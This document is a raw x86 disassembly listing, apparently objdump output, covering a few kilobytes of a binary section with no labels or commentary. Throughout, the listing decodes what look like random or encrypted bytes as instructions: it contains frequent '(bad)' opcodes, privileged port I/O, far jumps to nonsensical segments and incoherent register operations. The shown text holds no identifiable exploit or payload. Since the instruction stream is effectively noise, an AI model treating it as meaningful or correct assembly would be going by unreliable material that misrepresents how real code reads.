  412c60:	jo     0x412c70
  412c62:	pushf  
  412c63:	push   ss
  412c64:	imul   ebp,DWORD PTR [ebx+0x15646412],0x6365f2d9
  412c6e:	sub    DWORD PTR [edi],edx
  412c70:	clc    
  412c71:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412c72:	mov    DWORD PTR ds:0xfe100d3f,esi
  412c78:	(bad)  
  412c79:	cmp    bl,bh
  412c7b:	stos   BYTE PTR es:[edi],al
  412c7c:	rcl    DWORD PTR [eax],1
  412c7e:	xor    eax,0xe87364a
  412c83:	xchg   BYTE PTR [esi],dh
  412c85:	mov    ebp,0xcd810d65
  412c8a:	(bad)  
  412c8b:	repnz ror BYTE PTR [esi+0x2a],1
  412c8f:	repnz fld st(2)
  412c92:	jo     0x412c24
  412c94:	or     cl,BYTE PTR [ebx+0x3b4c4ea6]
  412c9a:	ret    
  412c9b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412c9c:	(bad)  
  412c9d:	fbld   TBYTE PTR [edx+0x25]
  412ca0:	and    al,0x9d
  412ca2:	and    al,0xdb
  412ca4:	and    DWORD PTR [ecx+0x5d],esi
  412ca7:	inc    eax
  412ca8:	pshufw mm2,QWORD PTR [eax],0x3c
  412cac:	in     eax,0xc9
  412cae:	push   esi
  412caf:	aad    0x2f
  412cb1:	jno    0x412ce6
  412cb3:	imul   ecx,DWORD PTR ds:0x8e0867b5,0x58
  412cbb:	jnp    0x412c9e
  412cbd:	mov    dl,0x4f
  412cbf:	nop
  412cc0:	test   eax,0xcdf95b88
  412cc5:	lea    ebx,[ebp-0x484a855]
  412ccb:	mov    esp,0x17867a21
  412cd0:	adc    ch,bl
  412cd2:	pop    edx
  412cd3:	jmp    0x5e14e101
  412cd8:	addr16 pop esp
  412cda:	mov    ds:0xcd6ffc69,al
  412ce0:	add    esi,DWORD PTR [eax+0xc]
  412ce3:	(bad)
  412ce6:	and    al,0x2a
  412ce8:	das    
  412ce9:	fdivrp st(4),st
  412ceb:	repz pusha 
  412ced:	sub    ecx,0xe9767270
  412cf3:	mov    bh,0x72
  412cf5:	push   0x69
  412cf7:	test   al,0xe8
  412cf9:	sbb    ch,BYTE PTR [eax+0x728c4b21]
  412cff:	jge    0x412cce
  412d01:	cmp    eax,0xb051d9c0
  412d06:	adc    al,0x8
  412d08:	cld    
  412d09:	(bad)  
  412d0a:	pop    ss
  412d0b:	aam    0xde
  412d0d:	dec    ebx
  412d0e:	push   cs
  412d0f:	or     al,0x36
  412d11:	push   ebx
  412d12:	sbb    esp,ecx
  412d14:	mov    ds:0x51ef2521,eax
  412d19:	outs   dx,BYTE PTR ds:[esi]
  412d1a:	pop    eax
  412d1b:	pop    DWORD PTR [eax+0x7f107df5]
  412d21:	xchg   ebx,eax
  412d22:	add    dl,bl
  412d24:	inc    edx
  412d25:	cdq    
  412d26:	test   DWORD PTR [esi+0x56efa4bf],0x40568a6a
  412d30:	adc    BYTE PTR [edi+0x3],0x55
  412d34:	popa   
  412d35:	jmp    0x412d3b
  412d37:	repz dec esi
  412d39:	push   ecx
  412d3a:	inc    ecx
  412d3b:	dec    edi
  412d3c:	push   eax
  412d3d:	dec    edi
  412d3e:	ror    DWORD PTR [esi+0x18cceebf],1
  412d44:	inc    eax
  412d45:	xchg   DWORD PTR [eax-0x64],ecx
  412d48:	cmp    dh,bl
  412d4a:	clc    
  412d4b:	aam    0xc2
  412d4d:	(bad)  
  412d4e:	rcr    DWORD PTR [ebx-0x21],cl
  412d51:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412d52:	int3   
  412d53:	cmp    ah,ah
  412d55:	in     eax,dx
  412d56:	dec    ebp
  412d57:	cmc    
  412d58:	mov    dl,ch
  412d5a:	addr16 popf 
  412d5c:	mov    bl,ah
  412d5e:	retf   
  412d5f:	add    DWORD PTR [eax-0x3f8aa68e],ebp
  412d65:	jge    0x412dcc
  412d67:	jl     0x412d2b
  412d69:	jmp    0x412d51
  412d6b:	jns    0x412d67
  412d6d:	push   cs
  412d6e:	aaa    
  412d6f:	mov    WORD PTR [edi-0x26],cs
  412d72:	mov    bh,0xf8
  412d74:	jmp    0x49f0:0x94d909ce
  412d7b:	icebp  
  412d7c:	xchg   ebp,eax
  412d7d:	outs   dx,DWORD PTR ds:[esi]
  412d7e:	ror    BYTE PTR [esp+eax*2+0x4574f9be],1
  412d85:	out    dx,al
  412d86:	mov    ch,0x46
  412d88:	mov    dh,0x94
  412d8a:	fisttp QWORD PTR [ebx+0x58]
  412d8d:	test   DWORD PTR [edi],ebp
  412d8f:	mov    ds:0x69a89b59,eax
  412d94:	add    al,0x1a
  412d96:	xor    BYTE PTR fs:[edi-0x47],dh
  412d9a:	call   0xb118:0xce0226a
  412da1:	in     eax,dx
  412da2:	mov    ss,WORD PTR [ecx+0x2f69965f]
  412da8:	mov    ah,0x1f
  412daa:	dec    edx
  412dab:	nop
  412dac:	dec    ecx
  412dad:	es adc BYTE PTR ds:[ecx-0x69537e35],0xcf
  412db6:	push   ebx
  412db7:	ja     0x412e26
  412db9:	scas   eax,DWORD PTR es:[edi]
  412dba:	pop    esi
  412dbb:	push   0xffffffc8
  412dbd:	stos   BYTE PTR es:[edi],al
  412dbe:	retf   
  412dbf:	sub    DWORD PTR fs:[eax+0x56],0xffffffbe
  412dc4:	int    0x6d
  412dc6:	or     BYTE PTR [ecx-0x51],dl
  412dc9:	pop    ebx
  412dca:	jns    0x412dcd
  412dcc:	or     BYTE PTR [ebx-0x79],bl
  412dcf:	das    
  412dd0:	pop    edi
  412dd1:	push   ss
  412dd2:	div    DWORD PTR [ecx-0x42]
  412dd5:	xchg   ebx,eax
  412dd6:	retf   0xc328
  412dd9:	mov    dh,0xa9
  412ddb:	into   
  412ddc:	icebp  
  412ddd:	mov    bh,0xbc
  412ddf:	push   esp
  412de0:	xor    DWORD PTR [ecx-0x2d245f9f],esi
  412de6:	cmp    ah,BYTE PTR [edx+0x680696bd]
  412dec:	cdq    
  412ded:	test   BYTE PTR [ebx],al
  412def:	bound  ecx,QWORD PTR [esi-0x72]
  412df2:	aas    
  412df3:	mov    cl,0x39
  412df5:	sub    eax,0x4ef0df1
  412dfa:	scas   eax,DWORD PTR es:[edi]
  412dfb:	sbb    eax,eax
  412dfd:	and    esp,DWORD PTR [eax+0x771ff84a]
  412e03:	adc    BYTE PTR [esi-0x49935dc],dh
  412e09:	xchg   esp,eax
  412e0a:	(bad)  
  412e0c:	xchg   ecx,eax
  412e0d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412e0e:	gs aaa 
  412e10:	xchg   edi,eax
  412e11:	dec    ebx
  412e12:	push   ds
  412e13:	mov    ah,0x74
  412e15:	in     eax,dx
  412e16:	and    ecx,DWORD PTR [ecx-0x27e21b72]
  412e1c:	inc    DWORD PTR [ecx-0x216bebaa]
  412e22:	or     BYTE PTR [esi-0x87d45ef],cl
  412e28:	push   ebx
  412e29:	fcomp  QWORD PTR [esi-0x78]
  412e2c:	outs   dx,BYTE PTR ds:[esi]
  412e2d:	or     eax,0x702b653c
  412e32:	adc    eax,0xe06e21f3
  412e37:	add    al,0x7f
  412e39:	sbb    bh,BYTE PTR [edi]
  412e3b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412e3c:	sbb    esi,DWORD PTR ss:[ebx]
  412e3f:	loop   0x412eb6
  412e41:	jg     0x412e58
  412e43:	push   ds
  412e44:	or     cl,BYTE PTR [ebx-0x5a]
  412e47:	sub    dl,BYTE PTR [ecx]
  412e49:	xor    DWORD PTR fs:[eax+edx*2],0x40
  412e4e:	cmp    al,dh
  412e50:	mov    esi,ecx
  412e52:	shl    BYTE PTR [edi-0x195fff89],0x2c
  412e59:	sti    
  412e5a:	sbb    eax,0x2ef42678
  412e5f:	sub    BYTE PTR [ebp+0x686e09e1],bh
  412e65:	ret    
  412e66:	pop    ebp
  412e67:	mov    ecx,0xd8a922cf
  412e6c:	stos   DWORD PTR es:[edi],eax
  412e6d:	scas   eax,DWORD PTR es:[edi]
  412e6e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412e6f:	push   ds
  412e70:	popf   
  412e71:	stc    
  412e72:	(bad)  
  412e73:	fs mov ch,0x81
  412e76:	popf   
  412e77:	push   cs
  412e78:	push   ds
  412e79:	xchg   edi,eax
  412e7a:	jge    0x412e3a
  412e7c:	js     0x412ed0
  412e7e:	enter  0x31d8,0xd5
  412e82:	sub    al,bl
  412e84:	add    DWORD PTR [edx+0x1c],ebp
  412e87:	adc    BYTE PTR [esi+0x5e],ah
  412e8a:	(bad)  
  412e8b:	xlat   BYTE PTR ds:[ebx]
  412e8c:	ja     0x412e52
  412e8e:	enter  0x9a8b,0xb1
  412e92:	mov    ch,0x48
  412e94:	in     al,0x70
  412e96:	jne    0x57bea5ed
  412e9c:	or     DWORD PTR [ebp+0x63],ecx
  412e9f:	imul   edi,DWORD PTR [ebp+0x48c93eb],0x1e
  412ea6:	jno    0x412efe
  412ea8:	in     al,dx
  412ea9:	daa    
  412eaa:	adc    edi,DWORD PTR [edi+edx*1+0xbdee2a8]
  412eb1:	(bad)  
  412eb2:	mov    ecx,0x1366ccbd
  412eb7:	xor    eax,0xa4fa9816
  412ebc:	cmp    edx,DWORD PTR [ecx-0x5a5ccabd]
  412ec2:	mov    eax,ds:0x2818eb02
  412ec7:	mov    ebp,0x4c356dbb
  412ecc:	ror    DWORD PTR [ecx-0x3b],cl
  412ecf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412ed0:	fcom   QWORD PTR [ebx+0xeb1d699]
  412ed6:	mov    ebx,0x3ec5e309
  412edb:	shr    DWORD PTR [ecx],0x33
  412ede:	ins    BYTE PTR es:[edi],dx
  412edf:	push   cs
  412ee0:	(bad)  
  412ee1:	retf   
  412ee2:	adc    DWORD PTR [ecx-0x6f7dd24b],eax
  412ee8:	adc    eax,0xfc4ae437
  412eed:	and    BYTE PTR [ebp-0x6a1e1c42],bl
  412ef3:	sub    ah,BYTE PTR [eax-0x4ecb8331]
  412ef9:	mov    edx,DWORD PTR [ebx+0x42]
  412efc:	test   eax,0x3dffbe81
  412f01:	add    ch,cl
  412f03:	ja     0x412e8c
  412f05:	add    eax,0x8d387e58
  412f0a:	sub    edx,esp
  412f0c:	clc    
  412f0d:	stos   BYTE PTR es:[edi],al
  412f0e:	push   es
  412f0f:	je     0x412ee7
  412f11:	dec    ebp
  412f12:	stos   DWORD PTR es:[edi],eax
  412f13:	jae    0x412f52
  412f15:	xchg   esp,eax
  412f16:	iret   
  412f17:	in     al,0x9e
  412f19:	scas   eax,DWORD PTR es:[edi]
  412f1a:	ror    BYTE PTR ds:0xf49537a8,cl
  412f20:	ret    0xce14
  412f23:	aad    0x7a
  412f25:	out    0xa8,eax
  412f27:	xchg   edi,eax
  412f28:	dec    esi
  412f29:	mov    cl,0x8e
  412f2b:	add    eax,0x625f0459
  412f30:	cmovle edx,ebx
  412f33:	cli    
  412f34:	retf   0x67e1
  412f37:	ret    0x8781
  412f3a:	ja     0x412f31
  412f3c:	dec    ebp
  412f3d:	std    
  412f3e:	pop    esp
  412f3f:	pop    ds
  412f40:	mov    ebx,0x498beb34
  412f45:	sar    DWORD PTR [edi-0x7b099d16],cl
  412f4b:	mov    bh,0xad
  412f4d:	leave  
  412f4e:	enter  0x52f1,0x34
  412f52:	lahf   
  412f53:	and    DWORD PTR [eax],ebp
  412f55:	mov    gs,WORD PTR [edi]
  412f57:	les    ebp,FWORD PTR [ebx-0x40]
  412f5a:	retf   0xe53b
  412f5d:	cmp    ebx,DWORD PTR [ecx+0x3c28d60b]
  412f63:	sti    
  412f64:	xor    BYTE PTR [esi-0xcf477a4],cl
  412f6a:	mov    bh,0xd0
  412f6c:	imul   eax,DWORD PTR [ebp-0x4e8871c0],0xfffffff5
  412f73:	imul   edi,ebx,0x56e99ae6
  412f79:	adc    al,0xec
  412f7b:	dec    ebx
  412f7c:	ret    
  412f7d:	adc    al,0x89
  412f7f:	or     ecx,ebx
  412f81:	pop    ss
  412f82:	cmp    BYTE PTR [ebx],bl
  412f84:	outs   dx,BYTE PTR ds:[esi]
  412f85:	test   dh,bh
  412f87:	das    
  412f88:	outs   dx,BYTE PTR ds:[esi]
  412f89:	push   ebx
  412f8a:	mul    DWORD PTR [ecx-0x669dd863]
  412f90:	cmp    DWORD PTR [ebx],0xcb6ec025
  412f96:	mov    BYTE PTR [ecx+0x2d],bh
  412f99:	pause  
  412f9b:	mov    edi,0xf0a5c650
  412fa0:	sub    DWORD PTR [ebx+0x22],ecx
  412fa3:	inc    eax
  412fa4:	jle    0x412f44
  412fa6:	cmp    ebx,DWORD PTR [ecx+0x5b7fc9b7]
  412fac:	outs   dx,DWORD PTR cs:[esi]
  412fae:	mov    al,ds:0xe242ebce
  412fb3:	push   ss
  412fb4:	fstp   TBYTE PTR [ebx+0x3d55e033]
  412fba:	mov    esp,esp
  412fbc:	out    0x62,eax
  412fbe:	sbb    edi,ebx
  412fc0:	push   esp
  412fc1:	hlt    
  412fc2:	les    ebp,FWORD PTR ds:0x82711c92
  412fc8:	jbe    0x412ff7
  412fca:	adc    DWORD PTR [ebp+esi*2-0x5c],esi
  412fce:	fbstp  TBYTE PTR [eax]
  412fd0:	adc    ch,BYTE PTR [ecx]
  412fd2:	pop    edx
  412fd3:	mov    al,ds:0x3b75b9aa
  412fd8:	mul    edi
  412fda:	mov    dl,0xa
  412fdc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412fdd:	jmp    0xc09:0xabb9c97f
  412fe4:	jns    0x413061
  412fe6:	(bad)  
  412fe7:	not    cl
  412fe9:	(bad)  
  412fea:	lock jo 0x412f76
  412fed:	inc    ecx
  412fee:	in     al,0x74
  412ff0:	or     eax,0xb58c3f34
  412ff5:	pop    ds
  412ff6:	and    al,0xb5
  412ff8:	and    BYTE PTR [edi],dh
  412ffa:	daa    
  412ffb:	and    ah,BYTE PTR [ecx+0x303aea33]
  413001:	push   esp
  413002:	xchg   ebx,eax
  413003:	lods   eax,DWORD PTR ds:[esi]
  413004:	and    ecx,DWORD PTR ds:0xaa13cfc1
  41300a:	sub    BYTE PTR [esp+ecx*1-0x265dd5a5],bh
  413011:	ficom  DWORD PTR [edx+edi*2+0x42]
  413015:	cmp    ebp,esp
  413017:	push   ecx
  413018:	addr16 cdq 
  41301a:	cmp    DWORD PTR [eax-0x7bc0acb],edx
  413020:	ja     0x413098
  413022:	jge    0x413038
  413024:	(bad)
  413027:	mov    ebp,0xe65fc8b9
  41302c:	cs xchg edx,eax
  41302e:	jne    0x413055
  413030:	add    bh,BYTE PTR ds:0xf51727af
  413036:	inc    eax
  413037:	dec    eax
  413038:	int    0xf9
  41303a:	rep outs dx,DWORD PTR ds:[esi]
  41303c:	enter  0x9d86,0x16
  413040:	inc    ebx
  413041:	mov    ch,0x23
  413043:	or     al,0xed
  413045:	push   esp
  413046:	sub    DWORD PTR gs:[esi-0x36],ebx
  41304a:	adc    al,0x8c
  41304c:	jnp    0x412fd8
  41304e:	out    dx,eax
  41304f:	and    al,0xab
  413051:	sar    DWORD PTR ds:0xc4766569,1
  413057:	add    esp,DWORD PTR [edx+0x45]
  41305a:	vmwrite ecx,DWORD PTR [edx]
  41305d:	cmp    ebx,DWORD PTR [edi-0x6a]
  413060:	push   esp
  413061:	push   ecx
  413062:	inc    esp
  413063:	rcl    DWORD PTR [esp+ebx*4+0x56ab92bd],0xb1
  41306b:	sar    DWORD PTR [ecx+eax*8-0x6433b2b6],1
  413072:	and    cl,BYTE PTR [ebp-0x2d]
  413075:	push   edx
  413076:	retf   
  413077:	enter  0xbed7,0xad
  41307b:	into   
  41307c:	xchg   ebx,eax
  41307d:	xchg   esp,eax
  41307e:	mov    dh,0x26
  413080:	repz xchg esi,eax
  413082:	sti    
  413083:	cmp    al,BYTE PTR [ecx+0x7d]
  413086:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413087:	data16 jbe 0x41300f
  41308a:	mov    dh,BYTE PTR [ebx+0x20]
  41308d:	jmp    0x1a9c8a10
  413092:	shl    DWORD PTR [edx],1
  413094:	sub    al,0xb4
  413096:	ins    DWORD PTR es:[edi],dx
  413097:	cmp    al,0x1c
  413099:	jl     0x41308d
  41309b:	into   
  41309c:	fstp   TBYTE PTR [edx+ecx*8]
  41309f:	loopne 0x4130f9
  4130a1:	sbb    DWORD PTR [eax+eiz*4],ecx
  4130a4:	mov    eax,0xf80f1008
  4130a9:	cmp    dl,BYTE PTR [esi]
  4130ab:	lock inc ebx
  4130ad:	mov    esi,0xcc43ec4
  4130b2:	es xor al,0xbc
  4130b5:	cmp    esp,DWORD PTR [ebp-0x3cbcc707]
  4130bb:	xchg   esi,eax
  4130bc:	dec    ecx
  4130bd:	ds dec ebx
  4130bf:	sub    ah,al
  4130c1:	iret   
  4130c2:	mov    ch,0x9c
  4130c4:	push   esi
  4130c5:	or     eax,0xa570f84c
  4130ca:	inc    esp
  4130cb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4130cc:	and    edi,ebp
  4130ce:	add    eax,0xfc19dce8
  4130d3:	cmp    edx,ecx
  4130d5:	sbb    eax,0x2a4c0e16
  4130da:	in     eax,dx
  4130db:	xlat   BYTE PTR ds:[ebx]
  4130dc:	or     eax,0xb7024fdf
  4130e1:	je     0x4130b6
  4130e3:	stos   BYTE PTR es:[edi],al
  4130e4:	xor    eax,0x6d5d771f
  4130e9:	outs   dx,DWORD PTR ds:[esi]
  4130ea:	sub    eax,ecx
  4130ec:	mov    cs,WORD PTR [edx-0x5d]
  4130ef:	xchg   edi,eax
  4130f0:	pop    eax
  4130f1:	sub    DWORD PTR [ecx],edx
  4130f3:	jp     0x41308f
  4130f5:	pop    es
  4130f6:	fisub  WORD PTR [eax+edx*8+0xff1e59]
  4130fd:	je     0x4130da
  4130ff:	inc    edi
  413100:	aam    0xfa
  413102:	and    ebp,esi
  413104:	in     al,dx
  413105:	aad    0x9f
  413107:	sbb    ch,BYTE PTR [esi]
  413109:	loope  0x413134
  41310b:	je     0x41310b
  41310d:	or     edx,DWORD PTR ds:0x4d891b5d
  413113:	daa    
  413114:	leave  
  413115:	pop    ss
  413116:	or     ah,ah
  413118:	in     al,0x2e
  41311a:	sub    BYTE PTR [ebx+0x2656691],bl
  413120:	lahf   
  413121:	cmp    BYTE PTR [ebx-0x7e],dl
  413124:	nop
  413125:	jne    0x413152
  413127:	xchg   edi,eax
  413128:	xor    eax,0x6e61342
  41312d:	imul   ebx,DWORD PTR [edi],0x309f1de7
  413133:	cmp    dh,BYTE PTR [eax-0xb]
  413136:	inc    edi
  413137:	std    
  413138:	dec    ebx
  413139:	push   esi
  41313a:	fs push 0x94db89e1
  413140:	sbb    DWORD PTR [eax-0x353f1318],0xeae3d245
  41314a:	pop    ebp
  41314b:	retf   
  41314c:	sti    
  41314d:	xor    eax,0x88a22374
  413152:	imul   ecx,DWORD PTR [edi+0x29769557],0x24d4de54
  41315c:	imul   ebx,DWORD PTR [ecx],0xda809c27
  413162:	popa   
  413163:	xchg   edi,eax
  413164:	(bad)  
  413165:	mov    WORD PTR [ebx+0x3231bd1c],?
  41316b:	sbb    ebx,eax
  41316d:	cmp    BYTE PTR [edi],ah
  41316f:	mov    DWORD PTR [ebx+0x5d],ebx
  413172:	xor    BYTE PTR [edx],dl
  413174:	mov    DWORD PTR ds:0xcd651466,esi
  41317a:	pop    eax
  41317b:	test   esi,esp
  41317d:	rol    DWORD PTR [ebp-0x5f],cl
  413180:	sbb    BYTE PTR [ecx-0x7b],dh
  413183:	pop    esp
  413184:	sbb    eax,0xb758799f
  413189:	leave  
  41318a:	pop    eax
  41318b:	and    DWORD PTR [edi-0x28eba116],0xaa6a3df
  413195:	loope  0x413179
  413197:	inc    ebx
  413198:	jmp    0x4131a0
  41319a:	mov    DWORD PTR [edi+ebp*8],edx
  41319d:	sub    BYTE PTR [ebx+0x18],dl
  4131a0:	loope  0x41314e
  4131a2:	fnstenv ds:0x8e0d67b4
  4131a8:	sub    BYTE PTR [edx-0x3848467a],0xf8
  4131af:	and    cl,BYTE PTR [ebx-0x690ae2e2]
  4131b5:	or     DWORD PTR [edi],esi
  4131b7:	sub    eax,0x4523b92e
  4131bc:	fld    DWORD PTR [edx]
  4131be:	mov    ebp,0xb7a603a2
  4131c3:	lds    eax,FWORD PTR [edi]
  4131c5:	rcl    DWORD PTR [edi],cl
  4131c7:	test   eax,0x4fffba6f
  4131cc:	push   ebx
  4131cd:	fcomp  DWORD PTR [eax+ebx*2+0x40]
  4131d1:	add    BYTE PTR [esi-0x3ad76422],0xd
  4131d8:	and    dh,BYTE PTR [eax+0x15]
  4131db:	push   edi
  4131dc:	or     al,0xa3
  4131de:	retf   0x8cb3
  4131e1:	test   BYTE PTR [eax-0x69eaca5b],dh
  4131e7:	in     al,0xac
  4131e9:	mov    bh,0xac
  4131eb:	xor    eax,DWORD PTR cs:[eax+edi*1]
  4131ef:	jno    0x4131c0
  4131f1:	fnsave [edx-0x38]
  4131f4:	arpl   WORD PTR [ebx+0x46],cx
  4131f7:	or     edx,edx
  4131f9:	aaa    
  4131fa:	pop    ss
  4131fb:	add    al,0x82
  4131fd:	test   al,0x95
  4131ff:	sbb    al,0xcd
  413201:	or     eax,0x75404c58
  413206:	stos   DWORD PTR es:[edi],eax
  413207:	mov    dl,0xf1
  413209:	push   ebp
  41320a:	push   ebx
  41320b:	ffreep st(7)
  41320d:	fst    st(7)
  41320f:	mov    ds,WORD PTR [eax+edi*2+0x7e]
  413213:	cmp    eax,0x25fad91c
  413218:	shr    DWORD PTR [esi-0x5863a7af],cl
  41321e:	and    ebp,ebx
  413220:	mov    fs,WORD PTR [edi]
  413222:	push   ebp
  413223:	mov    edi,0x5bc484f3
  413228:	xchg   edi,ecx
  41322a:	(bad)  
  41322b:	stc    
  41322c:	fist   DWORD PTR [edi-0x7bbd7be8]
  413232:	mov    ecx,0x6f6ffdbf
  413237:	jno    0x413221
  413239:	adc    eax,0x5bf4b57b
  41323e:	stos   BYTE PTR es:[edi],al
  41323f:	jae    0x413293
  413241:	lods   eax,DWORD PTR ds:[esi]
  413242:	sbb    al,0x23
  413244:	ret    0xfaae
  413247:	pop    eax
  413248:	mov    DWORD PTR [edx],edi
  41324a:	mov    DWORD PTR [eax-0x455e13b0],eax
  413250:	int3   
  413251:	mov    edi,0x6c29497d
  413256:	setl   BYTE PTR [ebp-0x1a766db0]
  41325d:	jmp    0xde24:0xcc6e90d8
  413264:	xor    DWORD PTR [esi-0x17],ebx
  413267:	pop    ebp
  413268:	xor    edx,ebx
  41326a:	inc    esi
  41326b:	xor    DWORD PTR [edx-0x67a291ed],eax
  413271:	shr    BYTE PTR [edi-0x18],cl
  413274:	les    ebp,FWORD PTR [ecx+0x2b926c3f]
  41327a:	mov    ah,0x11
  41327c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41327d:	popf   
  41327e:	mov    dl,0x9e
  413280:	stos   DWORD PTR es:[edi],eax
  413281:	mov    ds:0x79f408a1,al
  413286:	mov    esi,0x66ce1e4
  41328b:	sbb    al,0x8a
  41328d:	jb     0x41329c
  41328f:	(bad)  
  413290:	out    0x6,eax
  413292:	fnstenv [edi]
  413294:	pushf  
  413295:	xor    BYTE PTR [ebx],bh
  413297:	and    dl,bh
  413299:	add    eax,0xa7c9a4f7
  41329e:	jmp    0x4132e4
  4132a0:	push   esi
  4132a1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4132a2:	(bad)  
  4132a4:	add    al,0xc9
  4132a6:	pop    ds
  4132a7:	test   DWORD PTR [eax+0x5ad4abdf],edx
  4132ad:	push   0x29
  4132af:	fwait
  4132b0:	(bad)  
  4132b1:	sti    
  4132b2:	out    0xdc,al
  4132b4:	hlt    
  4132b5:	push   ebx
  4132b6:	arpl   dx,si
  4132b8:	jp     0x413283
  4132ba:	cmc    
  4132bb:	xor    al,0x6b
  4132bd:	iret   
  4132be:	push   esp
  4132bf:	or     BYTE PTR ds:0x7c28a34a,ah
  4132c5:	push   edi
  4132c6:	jno    0x4132f5
  4132c8:	icebp  
  4132c9:	push   ebp
  4132ca:	aaa    
  4132cb:	fiadd  WORD PTR [ebp+0x65]
  4132ce:	jp     0x413311
  4132d0:	and    BYTE PTR [ecx+0x4f],bl
  4132d3:	aaa    
  4132d4:	xor    eax,0xae5d154b
  4132d9:	inc    eax
  4132da:	and    bh,BYTE PTR [edi+0x78580ad4]
  4132e0:	jl     0x4132a2
  4132e2:	lds    esi,FWORD PTR [eax]
  4132e4:	sbb    al,0x15
  4132e6:	mov    ah,0xd1
  4132e8:	and    bl,0x48
  4132eb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4132ec:	pop    edx
  4132ed:	sbb    edx,edx
  4132ef:	in     eax,dx
  4132f0:	loop   0x413322
  4132f2:	cmp    bl,BYTE PTR [edx]
  4132f4:	mov    ecx,gs
  4132f6:	pop    ss
  4132f7:	sbb    esi,DWORD PTR [ebp+0x72]
  4132fa:	jo     0x4132b8
  4132fc:	add    BYTE PTR [edx+0x674fa026],cl
  413302:	push   ebp
  413303:	js     0x413329
  413305:	out    0x81,al
  413307:	add    DWORD PTR [ebx+0x6cbcaeac],0x4452b6d1
  413311:	mov    esp,esp
  413313:	out    0xa5,al
  413315:	popf   
  413316:	outs   dx,DWORD PTR ds:[esi]
  413317:	sub    esp,esi
  413319:	int3   
  41331a:	xor    ebp,DWORD PTR [ebp+0x25]
  41331d:	jb     0x4132c1
  41331f:	gs adc al,0x3
  413322:	push   0x61
  413324:	ins    DWORD PTR es:[edi],dx
  413325:	(bad)  
  413326:	(bad)  
  413327:	sbb    al,0xb4
  413329:	cs retf 
  41332b:	test   BYTE PTR [edx-0x32],bl
  41332e:	push   ecx
  41332f:	es (bad) 
  413331:	imul   ch
  413333:	test   eax,0x6e700ab7
  413338:	retf   
  413339:	iret   
  41333a:	jl     0x413333
  41333c:	jecxz  0x4133b0
  41333e:	ja     0x41332f
  413340:	cmp    al,0x5e
  413342:	push   cs
  413343:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413344:	stos   BYTE PTR es:[edi],al
  413345:	jmp    0x413329
  413347:	sub    eax,0xd9d4d003
  41334c:	rcr    esi,0x9a
  41334f:	fcomp  st(7)
  413351:	add    dl,al
  413353:	outs   dx,DWORD PTR ds:[esi]
  413354:	mov    DWORD PTR [ebp-0x1e90eb08],ecx
  41335a:	jnp    0x4132de
  41335c:	pop    ss
  41335d:	lods   al,BYTE PTR ds:[esi]
  41335e:	jbe    0x4133a1
  413360:	mov    ds:0xbfa30e31,al
  413365:	jb     0x413311
  413367:	mov    WORD PTR [ebp-0x10f820f7],?
  41336d:	(bad)  
  41336f:	ret    0xbd6e
  413372:	shr    cl,1
  413374:	and    eax,0x7c80be
  413379:	lods   al,BYTE PTR ds:[esi]
  41337a:	nop
  41337b:	mov    eax,ds:0xcdff3dca
  413380:	mov    ds:0xccf4882f,eax
  413385:	call   0xea4e:0xe0d034c
  41338c:	jecxz  0x413409
  41338e:	leave  
  41338f:	push   0xed9fa922
  413394:	sbb    al,0xc5
  413396:	pop    edi
  413397:	fdivr  DWORD PTR [eax+eiz*2-0xd]
  41339b:	xchg   esp,eax
  41339c:	lds    ebx,FWORD PTR [ebx+0x6b9dbb00]
  4133a2:	add    al,0xf2
  4133a4:	in     al,0xa
  4133a6:	out    0x4,al
  4133a8:	jmp    0xc0d1:0x74c2945d
  4133af:	jnp    0x4133de
  4133b1:	add    bh,BYTE PTR [esi]
  4133b3:	popa   
  4133b4:	ins    DWORD PTR es:[edi],dx
  4133b5:	xlat   BYTE PTR ds:[ebx]
  4133b6:	lods   al,BYTE PTR ds:[esi]
  4133b7:	fwait
  4133b8:	fwait
  4133b9:	mov    WORD PTR [ebp-0x2d],cs
  4133bc:	inc    ebp
  4133bd:	xor    eax,0xe04755ce
  4133c2:	inc    esp
  4133c3:	repz call 0x1e88:0xd40d4b4b
  4133cb:	dec    ecx
  4133cc:	int    0x19
  4133ce:	ins    BYTE PTR es:[edi],dx
  4133cf:	icebp  
  4133d0:	pushf  
  4133d1:	or     eax,0x7e4b6cb7
  4133d6:	mov    edi,esp
  4133d8:	xchg   DWORD PTR [edx],ebx
  4133da:	xor    eax,0xf47fbd20
  4133df:	test   al,0x8
  4133e1:	lds    esi,FWORD PTR [ecx-0x1e818653]
  4133e7:	jnp    0x4133c5
  4133e9:	mov    esi,0x3469fc1
  4133ee:	daa    
  4133ef:	lea    ebp,[edx-0x3c98ca65]
  4133f5:	xchg   edx,eax
  4133f6:	cdq    
  4133f7:	jo     0x413430
  4133f9:	loope  0x4133d4
  4133fb:	xchg   edx,ebx
  4133fd:	fnsave [ebx+0x25b76aa6]
  413403:	xchg   DWORD PTR [edi-0x28a76ab3],ecx
  413409:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41340a:	sub    cl,BYTE PTR [eax+0x456b0dbd]
  413410:	int3   
  413411:	push   ebx
  413412:	int    0xd6
  413414:	ss jb  0x41344a
  413417:	push   es
  413418:	pop    edi
  413419:	pop    ecx
  41341a:	push   0xffffff85
  41341c:	imul   edx,DWORD PTR [edx+eax*2],0x313d3660
  413423:	xchg   edi,eax
  413424:	rep ins DWORD PTR es:[edi],dx
  413426:	std    
  413427:	xchg   esi,eax
  413428:	sbb    ch,dl
  41342a:	ins    BYTE PTR es:[edi],dx
  41342b:	fisub  DWORD PTR [ebp-0x703e28c]
  413431:	lahf   
  413432:	ss mov ebx,0x4e46950
  413438:	push   es
  413439:	ret    0x6415
  41343c:	adc    bh,BYTE PTR [eax+0x26b8d2c7]
  413442:	pop    ss
